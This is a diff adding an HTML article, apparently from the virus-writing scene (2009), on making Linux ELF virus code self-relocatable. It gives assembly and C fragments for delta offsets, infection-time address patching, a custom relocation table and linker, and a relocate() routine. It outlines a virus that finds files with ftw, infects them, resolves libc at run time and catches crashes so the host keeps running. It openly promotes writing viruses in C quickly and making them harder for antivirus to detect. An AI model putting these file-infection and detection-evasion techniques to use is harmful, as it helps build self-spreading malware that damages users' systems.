@@ -1,0 +1,601 @@
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+	p {
+		text-align: justify;
+		text-indent: 1.5em;
+		margin: 0;
+	}
+	.content {
+		width: 85%;
+	}
+</style>
+<div class="content">
+
+<h1>From position-independent to self-relocatable viral code</h1>
+herm1t (x) jul,dec 2009
+
+<address>
+	herm1t &lt;<a href="mailto:herm1t@vx.netlux.org">herm1t@vx.netlux.org</a>&gt;<br />
+	<a href="http://vx.netlux.org/herm1t/">http://vx.netlux.org/herm1t/</a>
+</address>
+
+<ul>
+	<li><a href="#c0">Abstract</a></li>
+	<li><a href="#c1">Delta and base addresses</a></li>
+	<li><a href="#c2">Relocation</a></li>
+	<li><a href="#c3">Implementation</a>
+	<ul>
+		<li><a href="#c31">LD</a>
+	</ul></li>
+	<li><a href="#c4">Relocating the code without relocs</a></li>
+	<li><a href="#c5">Error handling</a></li>
+	<li><a href="#c6">Conclusion</a></li>
+	<li><a href="#c7">Examples</a>
+	<ul>
+		<li><a href="#c71">How to use the examples?</a>
+	</ul></li>
+</ul>
+
+
+<div style="float: right; width: 30em; text-align: justify;">
+	... The virus will now execute at a different virtual address depending
+	which infected program is running, but all this means is that Virgil
+	has to make sure his virus is position independent, using relative
+	instead of absolute addresses. That is not hard for an experienced
+	programmer to do.
+	
+	<p><cite>Andrew Tanenbaum "Modern operating systems"</cite></p>
+</div><br clear="all" />
+<br />
+<div style="float: right; width: 30em; text-align: justify;">
+	Do not prescribe to me what I am to do
+</div><br clear="all" />
+
+<h2><a name="c0"></a>Abstract</h2>
+<p>This article discusses the different approaches to position-independent
+and self-relocatable code. It shows that non-PIC style of the code allows
+substantially relax the limitations on virus code and use an advantages
+of high-level programming, which formerly were practically inaccessible
+to the virus authors.</p>
+
+<h2><a name="c1"></a>Delta and base addresses</h2>
+
+<p>To write about the delta-offset is like posting the article to the
+radio amateur magazine called "once again about constructing the power supply",
+but it is neccessary to start somewhere, so, once again about the delta-offset
+in viruses.</p>
+
+<pre>
+Zero virus generation	   Infected program
+8048100 |          |       |          | 8048100
+        | virus:   |       | program  |   &uarr;
+        |          |       |          |   delta- 
+        |          |       |...       |   offset = 0x8048200 - 0x8048100 = 0x100
+        |          |       +----------+   &darr;
+8048200 | variable |       | virus:   | 8048200 
+8048204 | _end     |       |          |
+                           |          |
+In regular program the     | variable | 8048300	Virus adds the delta to the
+reference to the variable  | _end:    | 8048304	addresses of its variables:
+looks as follows:				mov edx, [ebp + variable]
+B8 00 82 04 08 mov eax, [variable]		89 95 00 82 04 80
+</pre>
+<p>A virus being written like a regular program will refuse to work right after
+infection, because there is no variable at address 0x8048200 in the infected
+program. The classical solution is to calculate the <em>delta-offset</em>, the
+difference between new virus address (inside victim) and old address (in the
+first generation):</p>
+<pre>
+_virus:		call	.L0
+.L0:		pop	ebp
+		sub	ebp, .L0
+; ebp contains difference between .L0 address (after compilation) and its
+; actual address in the memory
+		mov	eax, [ebp + var]		
+; add the delta to the variable' address set after compilation and we get
+; the right address of the variable in the infected process
+; 804888c: 8b 85 88 84 04 08
+;		mov    0x8048488(%ebp),%eax
+ 
+</pre>
+<p>All goes well, virus works... Let's look inside the code. I took the
+Win32.Cyanide virus (by Berniee), the code looks too much in fashion:</p>
+<pre>
+  40134a:       03 95 6a 10 40 00       add    0x40106a(%ebp),%edx
+  401350:       89 95 72 10 40 00       mov    %edx,0x401072(%ebp)
+  401356:       8b 50 20                mov    0x20(%eax),%edx
+  401359:       03 95 6a 10 40 00       add    0x40106a(%ebp),%edx
+  40135f:       89 95 7a 10 40 00       mov    %edx,0x40107a(%ebp)        
+</pre>
+<p>Why should we bear all that long constants?</p>
+<p>What if one will use an offsets from the start of the virus?</p>
+<pre>
+_virus:		call	.L0
+.L0:		pop	ebp
+		sub	ebp, (.L0 - _virus)
+; ebp contains <em>virus base address</em>, it does not incorporate what
+; address virus had after compilation
+
+
+; (var - _virus) is a <em>relative</em> address of the variable from the virus start
+		mov	eax, [ebp + (var - _virus)]
+; 804888c: 8b 85 f1 03 00 00
+;		mov     0x3f1(%ebp),%eax
+</pre>
+<p>It is as broad as it is long - six bytes, but values has changed. However,
+one could use any values as a "base point". Virus data area address for example:</p>
+<pre>
+_virus:		call	.L0
+.L0:		pop	ebp
+		sub	ebp, (.L0 - _virus) - (virus_data - _virus)
+; ebp - "virus_data" address in a current process, which is unrelated
+; to its values in the zero generation of the virus
+
+; (var - virus_data) is a <em>relative</em> address of "var" variable
+; from the start of data area (virus_data)
+		mov	eax, [ebp + (var - virus_data)]
+<strong>; 8048889: 8b 45 00
+;               mov    0x0(%ebp),%eax</strong>
+	virus_data:
+var		dd	0x55aa55aa
+</pre>
+<p>To obtain an addresses within the <em>code</em> one could use the negative
+offsets, for example, the address of virus' start is <tt>ebp - (virus_data - _virus)</tt>.
+Most often used variables could be placed in the beginning of the data area,
+it will give a certain economy.</p>
+
+<p>The same trick is used by position-independent code generated by the compiler.
+All addresses in use are relative from _GLOBAL_OFFSET_TABLE_. So the references
+to GOT (and below - .rodata, .text, ...) has negative offsets, above (.got.plt,
+.data) - positive.</p>
+
+<p>And now a few more words about the call instruction which is present in every
+example. This snippet was used and is in use so often that heuristic of one of
+the dumbest antiviruses, was trigerred by sequence CALL / POP / SUB at one time.
+But among the other things as early as fifteen yeras ago TLN proposed (<cite>"The Smallest Virus I Could Manage", vlad #3</cite>)
+just <em>patch</em> the delta into the copy of the virus at the stage of infection.
+Let's try it. Not the delta, but address of virus data:</p>
+
+<pre>
+_virus:		...
+		mov	ebp, strict dword 0
+; fix-vd - the offset from the virus' start of the word that must be patched
+; by virus_data address (virus address in the victim + (virus_data - _virus))
+fix_vd		equ	$ - 4 - _virus
+		mov	eax, [ebp + (var - virus_data)]
+</pre>
+<p>Actually the virus_data is just a <em>variable</em> and what does this mean?
+It means that it is possible to directly fix the absolute variables addresses:</p>
+<pre>
+; esi might be the virus start in the victim mapped to memory
+; edi - delta
+		add	[esi + fix_var], edi		
+		...
+		mov	eax, [var]
+fix_var		equ	$ - 4 - _virus
+</pre>
+<p>There is no more suspicious "call" instruction, neigher delta in its usual form,
+no good-looking relative addresses as well. And now one step forward. Couls we
+deal with <em>all</em> variables in such a way? The result would be not position-independent,
+but <em>relocatable</em> code. The same as in "common" programs.</p>
+
+<h2><a name="c2"></a>Relocation</h2>
+
+<p>The last example in the previous chapter showed how one could
+fix the variables addresses at infection time, but there is only one
+variable in the example and virus has a lot of them. What should we do?
+Should we emit several instructions for each variable? What a "common"
+programs use? This is it. All addresses that should be fixed (if the
+program is loaded at different address) have been placed in table.
+This table is called <em>relocation table</em>. Roughly speaking,
+the table holds the offsets of the words within program that must
+be fixed. Like so:</p>
+
+<pre>
+; esi might be the virus start in the victim mapped to memory
+; edi - delta
+		xor	ecx, ecx
+	relocate:
+		mov	eax, [rel + ecx * 4]
+; NB! real virus must have reloc here
+; fix_rel equ $ - 4 - _virus
+		add	[esi + eax], edi
+		inc	ecx
+		cmp	ecx, rel_count
+		jb	relocate
+		...
+		mov	eax, [var]
+fix_var		equ	$ - 4 - _virus
+		int	3
+var		dd	0x55aa55aa
+; relocation table
+rel		dd	fix_var
+;		dd	fix_rel
+rel_count	equ	($ - rel) / 4
+</pre>
+<p>As you can already see where I am going, I had no thought to write the
+code in such a way. The relocation table produced by the compiler and is
+present only in object files. To save the table in the executable file
+it is neccessary to pass the option "--emit-relocs" to the linker. After
+that one could disassemble the binary and check what's going on:</p>
+<pre>
+8048480:       a1 87 84 04 08          mov    0x8048487,%eax
+<strong>                       8048481: R_386_32       .text</strong>
+</pre>
+<p>There it is. Or this:</p>
+<pre>
+$ objdump -r ./a.out
+...
+RELOCATION RECORDS FOR [.text]:
+OFFSET   TYPE              VALUE 
+...
+00000401 R_386_32          .text
+</pre>
+<p>There is more to come. The presence or absence of the call insn or
+the length of MOV's which load the variables values doesn't get me at all.
+In very deed, <strong>by removing the position-independent code we relax
+the most rigid restriction on virus code style.</strong> <em>It means that
+from now it is possible to write a virus with hands down in any language
+without assembler and gimmiks of any kind.</em> C with all its features
+like callbacks, global variables, strings, library functions are at your
+service. Now you should not spend your time on asmjerking or
+<del>fucking badly</del> nicely tuning the compiler, but to <del>mentally
+XORing DWords</del> "virus technologies" on which we like <del>to bulshit
+by a mouth</del> that we have developed and justifiably proud of.</p>
+
+<h2><a name="c3"></a>Implementation</h2>
+
+<p>From theory to implementation. The most obvious way to implement it is
+to write a virus, compile it to object file (with relocks) and then rip out
+the virus' code, data and relocation table from the object file with a
+purposedly written program, and infect the victim with it. Once one should
+write a dropper anyway, why not to write a <em>linker</em> at a time?</p>
+
+<p>Let's begin with sorting out the relock's format.</p>
+
+<p>The relocation table for the .text section in the ELF files is stored
+in .rel.text section and contains the array of structures Elf32_Rel, which
+has the offset, type and reference to the symbol table (.dynsym), which in
+turn is an array of structures Elf32_Sym with a lots of fields, including
+value of symbol, section number, offset in string table (.dynstr) of a
+symbol's name... Enough? I wanted it to be implemented more simple too.</p>
+
+<p>The virus consists of "fragment" (to distinguish it from sections and
+segments defined in ELF file) of code and data. The code? Nuff said. The
+data fragment besides an initialized variables will hold an uninitialized
+variables (in the regular programs they live in .bss), strings (in regular
+programs - .rodata), relocation table and a string table with the names of
+external functions.</p>
+
+<p>The virus consists of search and infect routines and also the run-time
+linker (RTLD) and the function for retargetting to a new addresses (relocate()):</p>
+
+<pre>
+code "fragment"
++- stub.o --------------+
+| _start:		| __code_start
+|	pusha		|
+|	call	rtld	|
+|	popa		|
+|	jmp	__entry |
++- rtld.o --------------+
+| findlibc, rtld,       |
+| relocate              |
++- virus.o -------------+
+| main() ...            | __code_end
++-----------------------+
+data "fragment"
++-----------------------+
+| relocation table      | __data_start
+| ... virus data ...    |
+| string table          | __data_end
++-----------------------+
+</pre>
+<p>__* - is a special symbols, calculated by the linker, in the source code they defined as extern.</p>
+<p>After the start:</p>
+<ul>
+	<li>rtld() receives the control and</p>
+	<ul>
+		<li>Finds the standard library libc (you may find more details in <cite>"INT 0x80? No, thank you!", EOF#2</cite>)</li>
+		<li>Finds (resolve()) the mprotect(2) function address</li>
+		<li>Changes the code fragment memory permissions to R/W</li>
+		<li>Resolves the addresses of the external functions and patches it into virus' code.</li>
+		<li>Restores fragment's permissions back to RO</li>
+		<li>Calls main():
+		<li>
+			<li>which search for files with ftw(3) and try to infect them
+			<ul>
+				<li>infect() check the file type and if all matches, try to insert into file
+				the code and data of the virus. For the virus to be able to work within infected
+				file it is neccessary to fix the addresses in the code and data (within virus copy)
+				with relocate()
+				<ul>
+					<li>relocate() fetches from the relocation table the elements which are <em>not related</em> to the external functions and fixes them</li>
+				</ul></li>
+			</ul></li>
+		</ul></li>
+	</ul></li>
+	<li>The control is returned to the host program</li>
+</ul>
+<p>In this article I laying stress on fixing the addresses of virus' code and data.
+The imports is quite a different story, there is a possibility to add the "static"
+imports, relegating the resolving to the system's RTLD, without unhandy code:
+to patch slightly .dynsym, .dynstr, put somewhere aside the virus' PLT and GOT,
+but imports are related to relocs to a little degree, such that more about it next time.</p>
+
+<p>The relocation table consists of 32-bit values, terminated by 0xffffffff, where:</p>
+<table border="1">
+<tr><th>Bits</th><th>Name</th><th>Description</th></tr>
+<tr><td>31</td><td>SRC_FRAG</td><td>reloc resides in (0 code section, 1 - data)</td></tr>
+<tr><td>30..29</td><td>DST_FRAG</td><td>the value points to (0 - code, 1 - data, 2 - library function, 3 - special symbol)</td></tr>
+<tr><td>28</td><td>SRC_TYPE</td><td>Type of address (0 - sbsolute, 1 - relative)</td></tr>
+<tr><td>27-14</td><td>SRC_OFF</td><td>Offset within fragment (depending of SRC_FRAG) of code/data which should be patched</td></tr>
+<tr><td>13-0</td><td>DST_OFF</td><td>Offset within fragment (depending of DST_FRAG) of code/data, <strong>by which</strong> we should patch. If DST_FRAG = 2 this is offset to the name of external functionней in the string table, if DST_FRAG = 3, this is the number of symbol defined by the linker (the old entry point)</td></tr>
+</table>
+<p>So that value 0xa8166c00 means that the linker should calculate the dst address
+(fragment 1, the start of virus data + 11264) and place it
+(type 0, absolute address) to src address (fragment 1, the start
+of virus data + 8281).</p>
+<p>The easy way to explain it by showing an excerpt from the virus, relocating to the new addresses:</p>
+<pre>
+void relocate(uint8_t *text, uint8_t *data, uint32_t new_text, uint32_t new_data, uint32_t new_entry)
+{
+	reloc_t *rel;
+	uint32_t *src, dst;
+	for (rel = (reloc_t*)data; ! IS_FINI(*rel); rel++)
+		/* skip external symbols, they will be resolved at run-time */
+		if (DST_FRAG(*rel) != 2) { 
+			/* pointer to the value that must be fixed */
+			src = (uint32_t*)((SRC_FRAG(*rel) == 1 ?
+				data : text) + SRC_OFF(*rel));
+			/* there is only one internal symbol ("frag" 3) left: __entry */
+			dst = DST_FRAG(*rel) == 3 ?
+				new_entry : (DST_FRAG(*rel) ? new_data : new_text) + DST_OFF(*rel);
+			/* patch in absolute/relative value */
+			*src = SRC_TYPE(*rel) == 0 ?
+				dst : dst - ((SRC_FRAG(*rel) ? new_data : new_text) + SRC_OFF(*rel) + 4);
+		}
+}
+</pre>
+<p>The addresses of library functions:</p>
+<pre>
+	for ( ; ! IS_FINI(*rel); rel++)
+		if (DST_FRAG(*rel) == 2) {
+			uint32_t src, dst;
+			src = (uint32_t)(SRC_FRAG(*rel) ? &__data_start : &__code_start) + SRC_OFF(*rel);
+			dst = resolve(&libc, (char*)&__data_start + DST_OFF(*rel));
+			*(uint32_t*)src = SRC_TYPE(*rel) ? dst - (src + 4) : dst;
+		}
+</pre>
+<p>The most interesting part. How to prepare the table?</p>
+<h3><a name="c31"></a>LD</h3>
+<p>The virus source code compiled by gcc to object code, but
+not linked with ld(1) from binutils, but by its own linker.</p>
+<p>Broadly speaking, what is a linker? Where are several object files,
+which contains <em>undefined</em> [at the compilation stage] symbols
+(anything in the program defined as <code>extern</code>) and <em>global</em> ones
+(anything that is not <code>static</code>). The symbol could be either function
+or a variable. The goal of the linker - to bind (or <em>link</em>) them against
+each other, id est to put the global symbol's addresses (defined in one of the
+files) into the file where they are undefined. The more complex situations
+like weak symbols, symbols versioning and other indigestible details I will
+throw into the discard. It's not neccessary to re-write <code>ld(1)</code>.
+What "virus ld" is doing:</p>
+<ul>
+	<li>Read into memory all object files passed via command line</li>
+	<li>Copy all sections with SHF_ALLOC flag, either to code fragment (SHF_EXECINSTR sections), or to data fragment. If the section has the type SHT_NOBITS (.bss), its contents will not be copied, but zeroed. The linker memorizes the offset from which the section begin in the fragment.</li>
+	<li>Look through all relocation tables (sections of SHT_REL type), processing the records with R_386_32 and R386_PC32 types only</li>
+	<li>For each reloc record
+	<ul>
+		<li>Determine the fragment and offset where the reloc reside</li>
+		<li>Find the symbol to which the reloc is pointing. The possible variants:
+		<ul>
+			<li>Symbol is defined in one of the object files. Find the frgament/offset.</li>
+			<li>The symbol's name begin from __ - is is special symbols: start/end of code/data, old entry point. dst_freg = 3</li>
+			<li>Symbol not found. Consider it as external. Copy the name to the string table, memorize the offset within the string table. dst_frag = 2.</li>
+		</ul></li>
+		<li>Add reloc in our custom format to the table</li>
+	</ul>
+	<li>Relocation table and string table copied to the data frgament, all neccessary adjustments are made.</li>
+	<li>The new executable file is formed and written out. The same function (as in the virus code) (relocate()) is used. The various structure fields are filled at the least estimate as long as it works. ;-)</li>
+</ul>
+<p>...and it works. :-)</p>
+<h2><a name="c4"></a>Relocating the code without relocs</h2>
+
+<p>There is another interesting (for now rhetoric) question - is it possible
+to do the same thing (sacrificing some functionality) without tables and without
+personal linkers? Countrylike... yes, it is possible! Let's take any program,
+even like that:</p>
+<pre>
+int a = 10;
+int main()
+{
+	printf("Hello %d %d\n", a + 256, 11);
+}
+ 8048395:       6a 0b                   push   $0xb		; 11
+ 8048397:       a1 a0 95 04 08          mov    0x80495a0,%eax	; a
+ 804839c:       05 00 01 00 00          add    $0x100,%eax	; 256
+ 80483a1:       50                      push   %eax		; a + 256
+ 80483a2:       68 90 84 04 08          push   $0x8048490	; "Hello %d %d\n"
+ 80483a7:       e8 ec fe ff ff          call   8048298 &lt;printf@plt>      
+</pre>
+<p>Even an ass will understand that 80495a0, 8048490 and 8048298 are <em>addresses</em>,
+but 11 and 256 are <em>constants</em>, in such a case 80495a0 and 8048490 are
+<em>data</em> (points to .data and .rodata sections) and 8048298 is <em>code</em>,
+moreover ir is the external function call (.plt section). If the ass could
+understand this, so one could teach the virus this simple skill.</p>
+
+<p>To simplify the code, as in the previous case, I merging .data and .rodata,
+but this time with the linker script (info ld). One could produce the default
+linking script (<tt>ld --verbose</tt>) and a bit revise it by changing:</p>
+<pre>
+  .text           :
+  {
+    *(.text .stub .text.* .gnu.linkonce.t.*)
+    KEEP (*(.text.*personality*))
+    ...
+  .data           :
+  {
+    *(.data .data.* .gnu.linkonce.d.*)
+    ...
+</pre>
+to
+<pre>
+	__text_start =.;
+	_text : {
+		stub.o(.text)
+		virus.o(.text)
+	} =0x90909090
+	__text_end =.;
+	...
+</pre>
+<p>We need symbols which pointing to start/end of code/data (__text/data_start/end)
+<em>and</em> we need to remove from the virus code all functions defined in
+crt*.o (all that __do_global_dtors_aux, frame_dummy and other garbage). So,
+instead of *(.text) I write 1.o(.text), namely get the .text section only
+from the 1.o file (not from all files). .bss could be merged with data, or
+could be suppressed by ((section (".data"))) attribute on variables. ;-)</p>
+
+<p>In order to fix the addresses in the virus code I take the disassembler (<cite>YAD, EOF#2</cite>).
+The virus disassemble its own code and check all the constants (the parts of the
+instruction). If the constant fall into range [__text_start .. __text_end] the virus will
+consider it the address pointing to code, if [__data_start .. __data_end] - the data.
+The address could be fixed easily - one need to substract the old address of
+code/data (__text_start/__data_start) and add the new one (new_text/new_data - calculated
+in the infection routine):</p>
+
+<pre>
+		if(*(p - 1) == 0x61 && *p == 0xe9)
+			r = (3 &lt;&lt; 30) | (offset + 1);
+		else
+#define	CHECK_FOR_REL(a,b,c, d)	\
+		if (y.a >= (uint32_t)&__ ## b ## _start && y.a &lt;= (uint32_t)&__ ## b ## _end)	\
+			r = (offset + y.len - 4 + c) | (d &lt;&lt; 30);	\
+		else
+		CHECK_FOR_REL(data4, text, 0, 0)
+		CHECK_FOR_REL(data4, data, 0, 1)
+		CHECK_FOR_REL(addr4, text, -y.datasize, 0)
+		CHECK_FOR_REL(addr4, data, -y.datasize, 1)
+		;
+</pre>
+<p>The result is tored into table for the latter use.</p>
+
+<p>If the virus contains the <em>real constant</em> in the same range - the
+game is up. :-) There is a little chance to face it, furthermore such bug
+will be brought to light and fixed at the stage of debugging. The code could
+be improved with two simple rules:</p>
+
+<ul>
+	<li>The constant could not be address of code if it points inside instruction</li>
+	<li>The constant could not be address of data, it it is not aligned on the dword boundary</li>
+</ul>
+<p>One could be allured into using the same algorithm to move the victim's
+code, but such trick will be the last thing for a number of files.</p>
+
+<p><strong>NB!</strong> ... but looking into this more closely, I think that it
+is still possible to distinguish addresses from constants, at least in the
+files compiled by particular compiler. After all one could get the function
+prototypes from /usr/include (<tt>grep -r '^[^#].* [\*]*ftw[ ]*(' /usr/include|sed 's/[^(,\*)]//g'</tt>).
+You may laugh at it but there is something to think about.</p>
+
+<p>However, I know exactly how the code of my virus organized, so for the virus
+code this algo would work reliably even without additional checks.</p>
+<p>.. and it works. :-)</p>
+
+<h2><a name="c5"></a>Error handling</h2>
+<p>In the private conversation with acquaintance I got the good advice:
+<em>That would be easier [to set the exception handler], and this is how
+most Windows viruses operate, too. There are just too many things that
+can be wrong with the headers, it is not reasonable to check them all
+(or perhaps even to know them all).</em> This is true not only to headers.
+So, both viruses catching the SIGSEGV, SIGBUS signals. If the handler would
+receive the control it will restore the stack (the orig_esp variable) and
+will return the control to the host program.</p>
+
+<h2><a name="c6"></a>Conclusion</h2>
+<p>The devised method allows:</p>
+<ul>
+	<li><em>Essentially speed up and simplify the development.</em>
+	Earlier I <del>used an ordinaru powder</del> wrote the C prototypes,
+	when coded it in asm for a long and boring time, but now I am just
+	write the virus in one or two days. Although the boring coding
+	helped me to learn assembly which one need to know, but not
+	neccessary use it.</li>
+	<li><em>To improve the readability of sources</em> (are you interested
+	to know how to code in assembly the following expression: <tt>p->shdr[p->symtab[k].st_shndx].sh_flags
+	& SHF_EXECINSTR ? 0 : 1</tt>?<sup><a href="#f1" name="b1">[1]</a></sup>
+	I don't.</li>
+	<li><em>Complicate the detection</em>, the anti-virus programs always been troubled by HLL code
+	(<em>see</em> <del>rule 34</del> <tt>`cc1 --help`</tt>,
+	any polymorphic engine will die of envyness).</li>
+</ul>
+<p>It is possible to write the HLL code without such tricks, but existing solutions
+are limited to using of libraries (in due time it was suggested by <cite>Whale
+"Position-independent code in HLL. Loading DLL from memory."</cite>), or
+literally persuade the compiler to generate the "right" code in the "right"
+order, and after the compiler being updated the same should be done all over
+again. The <tt>-funit-at-a-time</tt> diversion alone could caus a lot of troubles!</p>
+
+<p>Contrary to popular belief, the C viruses are quite compact (2-3 kilobytes
+of code), it is possible to rewrite it in assembly and save a few hundreds of
+bytes, but <del>nobody cares</del> who really need this?</p>
+
+<h2><a name="c7"></a>Examples</h2>
+<dl>
+	<dt>1.asm</dt><dd>Delta offset. Classics.</dd>
+	<dt>2.asm</dt><dd>Address of virus in memory.</dd>
+	<dt>3.asm</dt><dd>Address of virus data in memory.</dd>
+	<dt>4.asm</dt><dd>The same, but without CALL.</dd>
+	<dt>5.asm</dt><dd>Fixing the address of the variable.</dd>
+</dl>
+<h3><a name="c71"></a>How to use the examples?</h3>
+<pre>
+$ make
+...
+$ gdb ./4
+...
+(gdb) r
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x080493e2 in ?? ()
+<em>one could check that the address of variable is correct</em>
+(gdb) info reg
+eax            0x55aa55aa       1437226410
+...
+<em>this is the fixed code in memory</em>
+(gdb) disas 0x080493d8 0x080493e2
+Dump of assembler code from 0x80493d8 to 0x80493e2:
+0x080493d8:     mov    $0x80493e2,%ebp
+0x080493dd:     mov    0x0(%ebp),%eax
+0x080493e0:     int    $0x3
+(gdb) q
+<em>the original code (in the file)</em>
+$ objdump -d 4|tail
+ 804888e:       bd 00 00 00 00          mov    $0x0,%ebp
+ 8048893:       8b 45 00                mov    0x0(%ebp),%eax
+ 8048896:       cd 03                   int    $0x3
+</pre>
+
+<hr size="1" />
+<p><a name="f1" href="#b1">1</a> Like this (-ggdb -Wa,-ahl). Like it? Want it?
+<pre style="font-size: 8pt;">
+ 1270 0b18 8B459C               movl    -100(%ebp), %eax
+ 1271 0b1b 8B4814               movl    20(%eax), %ecx
+ 1272 0b1e 8B459C               movl    -100(%ebp), %eax
+ 1273 0b21 8B501C               movl    28(%eax), %edx
+ 1274 0b24 8B45A8               movl    -88(%ebp), %eax
+ 1275 0b27 C1E004               sall    $4, %eax
+ 1276 0b2a 8D0402               leal    (%edx,%eax), %eax
+ 1277 0b2d 0FB7400E             movzwl  14(%eax), %eax
+ 1278 0b31 0FB7D0               movzwl  %ax, %edx
+ 1279 0b34 89D0                 movl    %edx, %eax
+ 1280 0b36 C1E002               sall    $2, %eax
+ 1281 0b39 01D0                 addl    %edx, %eax
+ 1282 0b3b C1E003               sall    $3, %eax
+ 1283 0b3e 8D0401               leal    (%ecx,%eax), %eax
+ 1284 0b41 8B4008               movl    8(%eax), %eax
+ 1285 0b44 83E004               andl    $4, %eax
+ 1286 0b47 85C0                 testl   %eax, %eax
+ 1287 0b49 0F94C0               sete    %al
+ 1288 0b4c 0FB6C0               movzbl  %al, %eax
+ 1289 0b4f 8945DC               movl    %eax, -36(%ebp)</pre></p>
+</div>
